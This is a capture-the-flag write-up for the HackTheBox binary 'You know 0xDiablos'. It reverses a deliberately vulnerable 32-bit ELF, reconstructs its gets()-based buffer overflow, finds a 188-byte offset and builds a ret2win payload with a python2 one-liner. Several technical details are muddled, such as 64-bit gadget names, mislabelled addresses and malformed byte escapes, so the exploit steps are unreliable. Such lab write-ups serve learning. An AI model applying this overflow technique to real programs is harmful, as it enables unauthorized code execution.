---
description: 08/22/2023
---

# ðŸ‘¿ You know 0xDiablos

## Challenge

{% embed url="https://app.hackthebox.com/challenges/you-know-0xdiablos" %}

## Challenge Description

> I missed my flag

## Enumeration

`file`:

{% code overflow="wrap" %}
```
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=ab7f19bb67c16ae453d4959fba4e6841d930a6dd, for GNU/Linux 3.2.0, not stripped 
```
{% endcode %}

`checksec`:

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

Interesting, this binary was compiled with <mark style="color:red;">no memory protections</mark> whatsoever.

## Reversing

Load up vuln in `ghidra`.

We have a non-stripped binary, let's check out `main()`'s decompilation and disassembly.

`main()`:

```c
undefined4 main(void)

{
  __gid_t __rgid;
  
  setvbuf(_stdout,(char *)0x0,2,0);
  __rgid = getegid();
  setresgid(__rgid,__rgid,__rgid);
  puts("You know who are 0xDiablos: ");
  vuln();
  return 0;
}
```

We can see a `setvbuf()` call that will open stream to change the block's buffer.

This means that information will appear on the destination file/terminal during it being written as long as it is unbuffered. Also, `fflush()` is commonly seen here, but we don't see it. This is to force out the block early.

The `puts()` call is simply just printing "`You know who are 0xDiablos:` " to the screen, immediately calling `vuln()` after and awaiting our input. This can be assumed that something in vuln() is being used to grab our STDIN.

So, we now know our next target/task, <mark style="color:yellow;">let's find out what's going on in the</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`vuln()`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">function</mark>.

`vuln()`:

```c
void vuln(void)

{
  char local_bc [180];
  
  gets(local_bc);
  puts(local_bc);
  return;
}
```

We can see that we are allocating a char data-type buffer of 180-bytes.

* However, we do not know the variable due to the compiler simply not caring about variables

`gets()` is a deprecated function that is super dangerous because it will allow us to store characters on the stack past the buffer. We can see that whatever we send via STDIN will be sent directly to our buffer `local_bc` which is of 180-bytes. So, I'm thinking buffer overflow of sorts?

* It is recommended to use `fgets()` instead.&#x20;

There is then a call to `puts()` that will print our whatever we sent to the buffer. Thus, reflecting our STDIN back to the console.

Upon further analysis, `flag()` is another lucrative function that is being used to print out our `flag.txt`! So it is now clear that we must conduct a ret2win attack since there are no memory protections in play and `flag()` is not being called in `main()` or `vuln()`, meaning that it is still being loaded in memory, but never being called.&#x20;

<mark style="color:yellow;">So, what if we can divert execution to flag() rather than returning to main after completing the</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`vuln()`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">function?</mark>

flag() decompilation:

```c
void flag(int param_1,int param_2)

{
  char local_50 [64];
  FILE *local_10;
  
  local_10 = fopen("flag.txt","r");
  if (local_10 != (FILE *)0x0) {
    fgets(local_50,0x40,local_10);
    if ((param_1 == L'\xdeadbeef') && (param_2 == L'\xc0ded00d')) {
      printf(local_50);
    }
    return;
  }
  puts("Hurry up and try in on server side.");
                    /* WARNING: Subroutine does not return */
  exit(0);
}

```

Please note that I converted the hex values of the parameters to strings so I could place them in a human-readable format.

We can see that we have 2 parameters. Since this is a 32-bit program, they will be stored on the stack rather than in registers. This means that we will need to find a ROP gadget and be able to POP these values onto the stack.

<mark style="color:yellow;">param\_1</mark> = `xdeadbeef`

<mark style="color:yellow;">param\_2</mark> = `xc0ded00d`

At this point, I thought it would be fun to try to put the code close to the original source as possible:

`vuln-reconstructed.c`:

```c
#include <stdio.h>

void flag(int param_1,int param_2)

{
  char local_50 [64];
  FILE *local_10;
  
  local_10 = fopen("flag.txt","r");
  if (local_10 != (FILE *)0x0) {
    fgets(local_50,0x40,local_10);
    if ((param_1 == L'\xdeadbeef') && (param_2 == L'\xc0ded00d')) {
      printf(local_50);
    }
    return;
  }
  puts("Hurry up and try in on server side.");
                
  exit(0);
}

void vuln(void)

{
  char local_bc [180];
  
  gets(local_bc);
  puts(local_bc);
  return;
}

void main(void)

{
  __gid_t __rgid;
  
  setvbuf(stdout,(char *)0x0,2,0);
  __rgid = getegid();
  setresgid(__rgid,__rgid,__rgid);
  puts("You know who are 0xDiablos: ");
  vuln();
  return 0;
}
```

It compiled and worked perfectly. This was just for fun though since I'm still learning!

Compilation:

{% code overflow="wrap" %}
```
gcc vuln-reconstructed.c -o vuln-reconstructed -m32 -fno-stack-protector -z execstack -no-pie -g
```
{% endcode %}

Let's find the offset to the return address:

We will want to use `vuln()` since that is what we are targeting.

<figure><img src="../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

Okay we see `0xbc` being placed onto the stack.

Let's convert this to decimal to get the offset:

<figure><img src="../../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>

188!

We can also do this in `gdb`:

```
cyclic 200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
```

Cool, we now have a cyclic pattern that changes every 4-bytes.

Let's send it to our program so we store it in our 188-byte buffer. This will obviously overflow due to the usage of `gets()`, but this is what we want. <mark style="color:yellow;">So we can see the first 4-bytes that overwrite the EIP</mark>.

<figure><img src="../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

We can see that the first 4-bytes that overflow the EIP is 'waab'.

We can then do a `cyclic -l` to see the offset:

```
cyclic -l waab
Finding cyclic pattern of 4 bytes: b'waab' (hex: 0x77616162)
Found at offset 188
```

Boom! Same thing that we gathered from `ghidra`.

Viewing the disassembly of `vuln()`:

<figure><img src="../../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>

Let's grab the EBP of `vuln()`: <mark style="color:red;">`0x08049272`</mark>

## Exploitation

### Manual Exploitation

We can use python2 to overflow the buffer.&#x20;

Exploit Structure: <mark style="color:yellow;">188 junk A's (padding) + POP\_RDI + param\_1 + POP\_RSI + param\_2 + "junk" + flag() return address</mark>

<mark style="color:red;">`0x08049272`</mark> <mark style="color:red;"></mark><mark style="color:red;">-> little-endian: "\0x72\0x92\0x04\0x08"</mark>

```
python2 -c 'print "A" * 188 + "\0x72\0x92\0x04\0x08"' > payload
```

We want to divert execution to `flag()`, so we need to grab the return address of that function via disassembly:

<figure><img src="../../.gitbook/assets/image (95).png" alt=""><figcaption></figcaption></figure>

`flag()` return address: <mark style="color:red;">`0x08049271`</mark>

<mark style="color:red;">`flag()`</mark> <mark style="color:red;"></mark><mark style="color:red;">return address -> little-endian: "</mark><mark style="color:red;">`\0x71\0x92\0x04\0x08`</mark><mark style="color:red;">"</mark>

Exploit:

```
./vuln < payload
```
